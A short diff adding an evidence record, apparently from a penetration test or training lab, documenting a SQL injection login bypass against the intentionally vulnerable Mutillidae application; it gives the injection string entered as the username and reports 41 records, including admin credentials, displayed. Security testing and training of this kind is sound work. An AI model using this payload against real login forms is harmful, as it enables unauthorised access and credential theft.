@@ -1,0 +1,8 @@
+EVIDENCE E-11: Mutillidae SQL Injection Proof
+Date: 2026-09-06
+Application: Mutillidae
+Username: admin' OR '1'='1' #
+Password: anything
+Result: 41 records displayed including admin credentials
+Status:  SQL Injection confirmed
+Screenshot: E-13_mutillidae_sqli_success.png
